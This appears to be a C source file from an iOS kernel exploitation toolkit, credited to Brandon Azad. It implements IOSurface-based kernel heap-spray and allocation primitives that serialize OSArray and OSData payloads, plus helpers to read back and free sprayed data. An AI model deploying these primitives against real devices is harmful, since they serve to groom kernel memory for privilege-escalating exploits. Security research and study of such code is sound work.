/*
 * iosurface.c
 * Brandon Azad
 */
#define IOSURFACE_EXTERN
#include "iosurface.h"

#include <assert.h>
#include <pthread.h>

#include "IOKitLib.h"
#include "log.h"
#include "parameters.h"
#include <iokit.h>
#include <common.h>
#include "platform.h"

// ---- IOSurface types ---------------------------------------------------------------------------

static uint32_t dict_create[] = {
    kOSSerializeMagic,
    kOSSerializeEndCollection | kOSSerializeDictionary | 1,
    kOSSerializeSymbol | 19,
    0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
    kOSSerializeEndCollection | kOSSerializeNumber | 32,
    0x1000,
    0x0,
};

typedef struct {
    mach_vm_address_t addr1;
    mach_vm_address_t addr2;
    mach_vm_address_t addr3;
    uint32_t id;
} surface_t;

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t _out1;
    union {
        uint32_t xml[0];
        char string[0];
    };
};

struct IOSurfaceValueArgs_string {
    uint32_t surface_id;
    uint32_t _out1;
    uint32_t string_data;
    char null;
};

struct IOSurfaceValueResultArgs {
    uint32_t out;
};

// ---- Global variables --------------------------------------------------------------------------

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// ---- Functions ---------------------------------------------------------------------------------

bool IOSurface_init()
{
    if (IOSurface_initialized) {
        return true;
    }
    IOSurfaceRoot = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (IOSurfaceRoot == MACH_PORT_NULL) {
        ERROR("could not find %s", "IOSurfaceRoot");
        return false;
    }
    kern_return_t kr = IOServiceOpen(
        IOSurfaceRoot,
        mach_task_self(),
        0,
        &IOSurfaceRootUserClient);
    if (kr != KERN_SUCCESS) {
        ERROR("could not open %s", "IOSurfaceRootUserClient");
        return false;
    }
    size_t size = 0;
    if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0) {
        size = 0xdd0;
    } else if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_11_1) {
        size = 0xbc8;
    } else {
        size = 0x6c8;
    }
    surface_t *surface = calloc(1, size);
    assert(surface != NULL);
    kr = IOConnectCallStructMethod(IOSurfaceRootUserClient, 0, dict_create, sizeof(dict_create), surface, &size);
    if (surface->id == 0) {
        surface->id = (uint32_t)surface->addr3;
    }
    IOSurface_id = surface->id;
    SafeFreeNULL(surface);
    if (kr != KERN_SUCCESS) {
        ERROR("could not create %s: 0x%x", "IOSurfaceClient", kr);
        return false;
    }
    IOSurface_initialized = true;
    return true;
}

void IOSurface_deinit()
{
    if (!IOSurface_initialized)
        return;
    IOSurface_initialized = false;
    IOSurface_id = 0;
    IOServiceClose(IOSurfaceRootUserClient);
    IOObjectRelease(IOSurfaceRoot);
}

/*
 * IOSurface_set_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::set_value().
 */
static bool
IOSurface_set_value(const struct IOSurfaceValueArgs* args, size_t args_size)
{
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        9, // set_value
        NULL, 0,
        args, args_size,
        NULL, NULL,
        &result, &result_size);
    if (kr != KERN_SUCCESS) {
        ERROR("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::get_value().
 */
static bool
IOSurface_get_value(const struct IOSurfaceValueArgs* in, size_t in_size,
    struct IOSurfaceValueArgs* out, size_t* out_size)
{
    kern_return_t kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        10, // get_value
        NULL, 0,
        in, in_size,
        NULL, NULL,
        out, out_size);
    if (kr != KERN_SUCCESS) {
        ERROR("failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::remove_value().
 */
static bool
IOSurface_remove_value(const struct IOSurfaceValueArgs* args, size_t args_size)
{
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        11, // remove_value
        NULL, 0,
        args, args_size,
        NULL, NULL,
        &result, &result_size);
    if (kr != KERN_SUCCESS) {
        ERROR("failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * base255_encode
 *
 * Description:
 * 	Encode an integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value)
{
    uint32_t encoded = 0;
    for (unsigned i = 0; i < sizeof(value); i++) {
        encoded |= ((value % 255) + 1) << (8 * i);
        value /= 255;
    }
    return encoded;
}

/*
 * xml_units_for_data_size
 *
 * Description:
 * 	Return the number of XML units needed to store the given size of data in an OSString.
 */
static size_t
xml_units_for_data_size(size_t data_size)
{
    return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

/*
 * serialize_IOSurface_data_array
 *
 * Description:
 * 	Create the template of the serialized array to pass to IOSurfaceUserClient::set_value().
 * 	Returns the size of the serialized data in bytes.
 */
static size_t
serialize_IOSurface_data_array(uint32_t* xml0, uint32_t array_length, uint32_t data_size,
    uint32_t** xml_data, uint32_t** key)
{
    uint32_t* xml = xml0;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    *xml++ = kOSSerializeArray | array_length;
    for (size_t i = 0; i < array_length; i++) {
        uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
        *xml++ = kOSSerializeData | (data_size - 1) | flags;
        xml_data[i] = xml;
        xml += xml_units_for_data_size(data_size);
    }
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
    *key = xml++; // This will be filled in on each array loop.
    *xml++ = 0; // Null-terminate the symbol.
    return (xml - xml0) * sizeof(*xml);
}

/*
 * IOSurface_spray_with_gc_internal
 *
 * Description:
 * 	A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
 */

static uint32_t total_arrays = 0;
static bool
IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count,
    void* data, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    assert(array_count <= 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    assert(extra_count < array_count);
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init();
    if (!ok) {
        return 0;
    }
    // How big will our OSUnserializeBinary dictionary be?
    uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
    // Allocate the args struct.
    struct IOSurfaceValueArgs* args;
    size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
    args = malloc(args_size);
    assert(args != 0);
    // Build the IOSurfaceValueArgs.
    args->surface_id = IOSurface_id;
    // Create the serialized OSArray. We'll remember the locations we need to fill in with our
    // data as well as the slot we need to set our key.
    uint32_t** xml_data = malloc(current_array_length * sizeof(*xml_data));
    assert(xml_data != NULL);
    uint32_t* key;
    size_t xml_size = serialize_IOSurface_data_array(args->xml,
        current_array_length, data_size, xml_data, &key);
    assert(xml_size == xml_units * sizeof(args->xml[0]));
    // Keep track of when we need to do GC.
    size_t sprayed = 0;
    size_t next_gc_step = 0;
    // Loop through the arrays.
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        // If we've crossed the GC sleep boundary, sleep for a bit and schedule the
        // next one.
        // Now build the array and its elements.
        *key = base255_encode(total_arrays + array_id);
        for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
            // Update the data for this spray if the user requested.
            if (callback != NULL) {
                callback(array_id, data_id, data, data_size);
            }
            // Copy in the data to the appropriate slot.
            memcpy(xml_data[data_id], data, data_size - 1);
        }
        // Finally set the array in the surface.
        ok = IOSurface_set_value(args, args_size);
        if (!ok) {
            free(args);
            free(xml_data);
            return false;
        }
        if (ok) {
            sprayed += data_size * current_array_length;
            // If we just sprayed an array with an extra element, decrement the
            // outstanding extra_count.
            if (current_array_length > array_length) {
                assert(extra_count > 0);
                extra_count--;
                // If our extra_count is now 0, rebuild our serialized array. (We
                // could implement this as a memmove(), but I'm lazy.)
                if (extra_count == 0) {
                    current_array_length--;
                    serialize_IOSurface_data_array(args->xml,
                        current_array_length, data_size,
                        xml_data, &key);
                }
            }
        }
    }
    if (next_gc_step > 0) {
        // printf("\n");
    }
    // Clean up resources.
    free(args);
    free(xml_data);
    total_arrays += array_count;
    return true;
}

bool IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
    void* data, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
        data, data_size, callback);
}

bool IOSurface_spray_size_with_gc(uint32_t array_count, size_t spray_size,
    void* data, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    assert(array_count <= 0xffffff);
    assert(data_size <= 0xffffff);
    size_t data_count = (spray_size + data_size - 1) / data_size;
    size_t array_length = data_count / array_count;
    size_t extra_count = data_count % array_count;
    assert(array_length <= 0xffff);
    return IOSurface_spray_with_gc_internal(array_count, (uint32_t)array_length,
        (uint32_t)extra_count, data, data_size, callback);
}

bool IOSurface_spray_read_array(uint32_t array_id, uint32_t array_length, uint32_t data_size,
    void (^callback)(uint32_t data_id, void* data, size_t size))
{
    assert(IOSurface_initialized);
    assert(array_id < 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    bool success = false;
    // Create the input args.
    struct IOSurfaceValueArgs_string args_in = {};
    args_in.surface_id = IOSurface_id;
    args_in.string_data = base255_encode(array_id);
    // Create the output args.
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    size_t xml_units = 1 + 1 + (1 + xml_units_per_data) * array_length;
    struct IOSurfaceValueArgs* args_out;
    size_t args_out_size = sizeof(*args_out) + xml_units * sizeof(args_out->xml[0]);
    // Over-allocate the output buffer a little bit. This allows us to directly pass the inline
    // data to the client without having to worry about the fact that the kernel data is 1 byte
    // shorter (which otherwise would produce an out-of-bounds read on the last element for
    // certain data sizes). Yeah, it's a hack, deal with it.
    args_out = malloc(args_out_size + sizeof(uint32_t));
    assert(args_out != 0);
    // Get the value.
    bool ok = IOSurface_get_value((struct IOSurfaceValueArgs*)&args_in, sizeof(args_in),
        args_out, &args_out_size);
    if (!ok) {
        goto fail;
    }
    // Do the ugly parsing ourselves. :(
    uint32_t* xml = args_out->xml;
    if (*xml++ != kOSSerializeBinarySignature) {
        ERROR("did not find OSSerializeBinary signature");
        goto fail;
    }
    if (*xml++ != (kOSSerializeArray | array_length | kOSSerializeEndCollection)) {
        ERROR("unexpected container");
        goto fail;
    }
    for (uint32_t data_id = 0; data_id < array_length; data_id++) {
        uint32_t flags = (data_id == array_length - 1 ? kOSSerializeEndCollection : 0);
        if (*xml++ != (kOSSerializeString | data_size - 1 | flags)) {
            ERROR("unexpected data: 0x%x != 0x%x at index %u",
                xml[-1], kOSSerializeString | data_size - 1 | flags,
                data_id);
            goto fail;
        }
        callback(data_id, (void*)xml, data_size);
        xml += xml_units_per_data;
    }
    success = true;
fail:
    free(args_out);
    return success;
}

bool IOSurface_spray_read_all_data(uint32_t array_count, uint32_t array_length, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    assert(IOSurface_initialized);
    assert(array_count <= 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    bool ok = true;
    //TODO: We should probably amortize the creation of the output buffer.
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        ok &= IOSurface_spray_read_array(array_id, array_length, data_size,
            ^(uint32_t data_id, void* data, size_t size) {
                callback(array_id, data_id, data, size);
            });
    }
    return ok;
}

bool IOSurface_spray_remove_array(uint32_t array_id)
{
    assert(IOSurface_initialized);
    assert(array_id < 0xffffff);
    struct IOSurfaceValueArgs_string args = {};
    args.surface_id = IOSurface_id;
    args.string_data = base255_encode(array_id);
    return IOSurface_remove_value((struct IOSurfaceValueArgs*)&args, sizeof(args));
}

bool IOSurface_spray_clear(uint32_t array_count)
{
    assert(IOSurface_initialized);
    assert(array_count <= 0xffffff);
    bool ok = true;
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        ok &= IOSurface_spray_remove_array(array_id);
    }
    return ok;
}

uint32_t
IOSurface_property_key(uint32_t property_index) {
	assert(property_index <= MAX_IOSURFACE_PROPERTY_INDEX);
	uint32_t encoded = base255_encode(property_index);
	assert((encoded >> 24) == 0x01);
	return encoded & ~0xff000000;
}

// ---- IOSurface_remove_property -----------------------------------------------------------------

bool
IOSurface_remove_property(uint32_t property_key) {
	assert(IOSurface_initialized);
	struct {
		struct IOSurfaceValueArgs header;
		uint32_t key;
	} args;
	args.header.surface_id = IOSurface_id;
	args.key = property_key;
	return IOSurface_remove_value(&args.header, sizeof(args));
}

// ---- IOSurface_kalloc_fast ---------------------------------------------------------------------

bool
IOSurface_kalloc_fast(uint32_t property_key, size_t kalloc_size) {
	assert(kalloc_size <= 0x10000000);
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// OSDictionary::initWithCapacity() will create a kalloc allocation of size 16 * capacity.
	// However, we're constrained by OSUnserializeBinary() to a maximum capacity value of
	// 0x00ffffff.
	kalloc_size = (kalloc_size + 0xf) & ~0xf;
	uint32_t capacity = (uint32_t) (kalloc_size / 16);
	if (capacity > 0x00ffffff) {
		capacity = 0x00ffffff;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct {
		struct IOSurfaceValueArgs header;
		uint32_t xml[8];
	} args;
	args.header.surface_id = IOSurface_id;
	args.xml[0] = kOSSerializeBinarySignature;
	args.xml[1] = kOSSerializeArray | 2 | kOSSerializeEndCollection;			// <array capacity="2">
	args.xml[2] = kOSSerializeDictionary | capacity;				//   <dict capacity="capacity">
	args.xml[3] = kOSSerializeSymbol | 2;						//     <sym len="2">
	args.xml[4] = 0xaa0000bb;							//       \xbb</sym>
	args.xml[5] = kOSSerializeBoolean | kOSSerializeEndCollection;			//     <false/></dict>
	args.xml[6] = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;	//   <sym len="4">
	args.xml[7] = property_key;							//     key</sym></array>
	ok = IOSurface_set_value(&args.header, sizeof(args));
	return ok;
}

// ---- IOSurface_kmem_alloc_fast -----------------------------------------------------------------

static size_t
xml_units_for_size(size_t size) {
	return (size + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

size_t
IOSurface_kmem_alloc_fast_buffer_size(size_t kmem_alloc_size) {
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return 0;
	}
	size_t header_size = sizeof(struct IOSurfaceValueArgs);
	size_t data_units = xml_units_for_size(kmem_alloc_size);
	// Magic + Array(2) + Data(size) + DATA + Sym(1) + SYM
	return header_size + (1 + 1 + 1 + data_units + 1 + 1) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_fast_prepare(
		size_t kmem_alloc_size,
		void *kmem_alloc_fast_buffer,
		size_t *kmem_alloc_fast_buffer_size,
		void (^initialize_data)(void *data)) {
	// OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
	// capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
	// 0x00ffffff.
	assert(page_size <= kmem_alloc_size && kmem_alloc_size <= 0xffffff);
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return false;
	}
	// Check that the buffer size is at least the minimum.
	size_t exact_size = IOSurface_kmem_alloc_fast_buffer_size(kmem_alloc_size);
	size_t buffer_size = *kmem_alloc_fast_buffer_size;
	*kmem_alloc_fast_buffer_size = exact_size;
	if (buffer_size < exact_size) {
		return false;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
	uint32_t *xml = args->xml;
	*xml++ = kOSSerializeBinarySignature;
	*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;			// <array capacity="2">
	*xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size;				//   <data len="size">
	initialize_data(xml);								//     ...
	xml   += xml_units_for_size(kmem_alloc_size);					//   </data>
	*xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;	//   <sym len="4">
	args->_out1 = (uint32_t) (xml - args->xml);					//     ...
	xml++;										//   </sym></array>
	// Verify the size.
	size_t size = ((uint8_t *) xml - (uint8_t *) args);
	assert(size == exact_size);
	return true;
}

bool
IOSurface_kmem_alloc_fast(uint32_t property_key,
		void *kmem_alloc_fast_buffer, size_t kmem_alloc_fast_buffer_size) {
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// Set the IOSurface ID and initialize the property index in the XML.
	struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
	args->surface_id = IOSurface_id;
	args->xml[args->_out1] = property_key;
	// Call IOSurfaceRootUserClient::set_value().
	return IOSurface_set_value(args, kmem_alloc_fast_buffer_size);
}

// ---- IOSurface_kmem_alloc_array_fast -----------------------------------------------------------

size_t
IOSurface_kmem_alloc_array_fast_buffer_size(size_t kmem_alloc_size, size_t kmem_alloc_count) {
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return 0;
	}
	size_t header_size = sizeof(struct IOSurfaceValueArgs);
	size_t data_units = xml_units_for_size(kmem_alloc_size);
	// Magic + Array(2) + Array(count) + count * (Data(size) + DATA) + Sym(1) + SYM
	return header_size + (3 + kmem_alloc_count * (1 + data_units) + 2) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_array_fast_prepare(
		size_t kmem_alloc_size,
		size_t kmem_alloc_count,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index)) {
	// OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
	// capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
	// 0x00ffffff for both the OSData and the OSArray.
	assert(page_size <= kmem_alloc_size && kmem_alloc_size <= 0xffffff
			&& kmem_alloc_count <= 0xffffff);
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff
			|| kmem_alloc_count > 0xffffff) {
		return false;
	}
	// Check that the buffer size is at least the minimum.
	size_t exact_size = IOSurface_kmem_alloc_array_fast_buffer_size(
			kmem_alloc_size, kmem_alloc_count);
	size_t buffer_size = *kmem_alloc_array_fast_buffer_size;
	*kmem_alloc_array_fast_buffer_size = exact_size;
	if (buffer_size < exact_size) {
		return false;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
	uint32_t *xml = args->xml;
	*xml++ = kOSSerializeBinarySignature;
	*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;			// <array capacity="2">
	*xml++ = kOSSerializeArray | (uint32_t) kmem_alloc_count;			//   <array len="count">
	for (size_t i = 0; i < kmem_alloc_count; i++) {					//     <!-- count copies -->
		uint32_t flags = (i == kmem_alloc_count - 1 ? kOSSerializeEndCollection : 0);	//     <!-- ends array -->
		*xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size | flags;		//     <data len="size">
		initialize_data(xml, i);						//       ...
		xml   += xml_units_for_size(kmem_alloc_size);				//     </data>
	}										//   </array>
	*xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;	//   <sym len="4">
	args->_out1 = (uint32_t) (xml - args->xml);					//     ...
	xml++;										//   </sym></array>
	// Verify the size.
	size_t size = ((uint8_t *) xml - (uint8_t *) args);
	assert(size == exact_size);
	return true;
}

bool
IOSurface_kmem_alloc_array_fast(uint32_t property_key,
		void *kmem_alloc_array_fast_buffer, size_t kmem_alloc_array_fast_buffer_size) {
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// Set the IOSurface ID and initialize the property index in the XML.
	struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
	args->surface_id = IOSurface_id;
	args->xml[args->_out1] = property_key;
	// Call IOSurfaceRootUserClient::set_value().
	return IOSurface_set_value(args, kmem_alloc_array_fast_buffer_size);
}

// ---- Convenience API ---------------------------------------------------------------------------

// Compute the number of elements to spray for IOSurface_kmem_alloc_array_fast_().
static size_t
IOSurface_kmem_alloc_array_fast_count_(size_t kmem_alloc_size, size_t spray_size) {
	size_t alloc_size = (kmem_alloc_size + (page_size - 1)) & ~(page_size - 1);
	return (spray_size + alloc_size - 1) / alloc_size;
}

bool
IOSurface_kmem_alloc_array_fast_prepare_(
		size_t kmem_alloc_size,
		size_t spray_size,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index)) {
	assert(kmem_alloc_size <= spray_size && spray_size <= *kmem_alloc_array_fast_buffer_size);
	size_t count = IOSurface_kmem_alloc_array_fast_count_(kmem_alloc_size, spray_size);
	return IOSurface_kmem_alloc_array_fast_prepare(
			kmem_alloc_size,
			count,
			kmem_alloc_array_fast_buffer,
			kmem_alloc_array_fast_buffer_size,
			initialize_data);
}
